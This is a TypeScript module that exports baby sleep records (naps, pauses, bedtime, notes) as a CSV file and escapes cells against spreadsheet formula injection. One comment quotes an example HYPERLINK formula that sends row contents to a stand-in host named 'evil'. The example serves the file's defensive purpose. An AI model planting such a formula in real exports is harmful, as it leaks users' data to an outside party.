import { parseHHMM, formatHHMM } from '$lib/time';

type Row = {
  date: string;
  wakeTime: string | null;
  nap1Start: string | null;
  nap1End: string | null;
  nap2Start: string | null;
  nap2End: string | null;
  nap3Start: string | null;
  nap3End: string | null;
  nap4Start: string | null;
  nap4End: string | null;
  nap1PauseMin?: number | null;
  nap2PauseMin?: number | null;
  nap3PauseMin?: number | null;
  nap4PauseMin?: number | null;
  bedtime: string | null;
  notes: string | null;
};

// CSV "formula injection" (CWE-1236): a cell that starts with `=`, `+`, `-`,
// `@`, TAB or CR is interpreted as a formula by Excel/LibreOffice when the
// file is opened. A note like `=HYPERLINK("http://evil/?x="&A1,"click")`
// would exfiltrate the row content the first time someone opens the export.
// Prefixing such cells with a single-quote forces the spreadsheet to treat
// them as literal text (the quote is consumed during display).
const FORMULA_CHARS = /^[=+\-@\t\r]/;

function escape(v: string | null): string {
  if (v == null) return '';
  const safe = FORMULA_CHARS.test(v) ? `'${v}` : v;
  if (/[";\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

function napCount(r: Row): number {
  return [r.nap1End, r.nap2End, r.nap3End, r.nap4End].filter(Boolean).length;
}

function napDur(start: string | null, end: string | null, pauseMin?: number | null): string {
  if (!start || !end || !/^\d{2}:\d{2}$/.test(start) || !/^\d{2}:\d{2}$/.test(end)) return '';
  const wall = ((parseHHMM(end) - parseHHMM(start)) % 1440 + 1440) % 1440;
  return formatHHMM(Math.max(0, wall - (pauseMin ?? 0)));
}

function napPause(pauseMin?: number | null): string {
  return pauseMin && pauseMin > 0 ? String(pauseMin) : '';
}

function totalDaySleep(r: Row): string {
  let total = 0;
  let hasAny = false;
  const triples: [string | null, string | null, number | null | undefined][] = [
    [r.nap1Start, r.nap1End, r.nap1PauseMin],
    [r.nap2Start, r.nap2End, r.nap2PauseMin],
    [r.nap3Start, r.nap3End, r.nap3PauseMin],
    [r.nap4Start, r.nap4End, r.nap4PauseMin]
  ];
  for (const [s, e, pause] of triples) {
    if (s && e && /^\d{2}:\d{2}$/.test(s) && /^\d{2}:\d{2}$/.test(e)) {
      const wall = ((parseHHMM(e) - parseHHMM(s)) % 1440 + 1440) % 1440;
      total += Math.max(0, wall - (pause ?? 0));
      hasAny = true;
    }
  }
  return hasAny ? formatHHMM(total) : '';
}

function durationPrevNight(curr: Row, prev: Row | null): string {
  if (!prev || !curr.wakeTime || !prev.bedtime) return '';
  const [y1, m1, d1] = curr.date.split('-').map(Number);
  const [y2, m2, d2] = prev.date.split('-').map(Number);
  const dayDiff = (Date.UTC(y1, m1 - 1, d1) - Date.UTC(y2, m2 - 1, d2)) / 86400000;
  if (dayDiff !== 1) return '';
  const dur = ((parseHHMM(curr.wakeTime) - parseHHMM(prev.bedtime)) % 1440 + 1440) % 1440;
  return formatHHMM(dur);
}

export function buildSleepCsv(rows: Row[], _babyName: string, opts: { priorEntry?: Row | null } = {}): string {
  const sortedDesc = [...rows].sort((a, b) => (a.date < b.date ? 1 : a.date > b.date ? -1 : 0));
  const lines: string[] = [];
  lines.push([
    'Date', 'Réveil',
    'S1 début', 'S1 fin', 'S1 pause (min)', 'S1 durée',
    'S2 début', 'S2 fin', 'S2 pause (min)', 'S2 durée',
    'S3 début', 'S3 fin', 'S3 pause (min)', 'S3 durée',
    'S4 début', 'S4 fin', 'S4 pause (min)', 'S4 durée',
    'Coucher', 'Nb siestes', 'Durée nuit préc.', 'Durée jour', 'Notes'
  ].join(';'));
  for (let i = 0; i < sortedDesc.length; i++) {
    const cur = sortedDesc[i];
    const prev = sortedDesc[i + 1] ?? opts.priorEntry ?? null; // older date
    lines.push([
      escape(cur.date),
      escape(cur.wakeTime),
      escape(cur.nap1Start), escape(cur.nap1End), napPause(cur.nap1PauseMin), napDur(cur.nap1Start, cur.nap1End, cur.nap1PauseMin),
      escape(cur.nap2Start), escape(cur.nap2End), napPause(cur.nap2PauseMin), napDur(cur.nap2Start, cur.nap2End, cur.nap2PauseMin),
      escape(cur.nap3Start), escape(cur.nap3End), napPause(cur.nap3PauseMin), napDur(cur.nap3Start, cur.nap3End, cur.nap3PauseMin),
      escape(cur.nap4Start), escape(cur.nap4End), napPause(cur.nap4PauseMin), napDur(cur.nap4Start, cur.nap4End, cur.nap4PauseMin),
      escape(cur.bedtime),
      String(napCount(cur)),
      durationPrevNight(cur, prev),
      totalDaySleep(cur),
      escape(cur.notes)
    ].join(';'));
  }
  return '﻿' + lines.join('\r\n') + '\r\n';
}
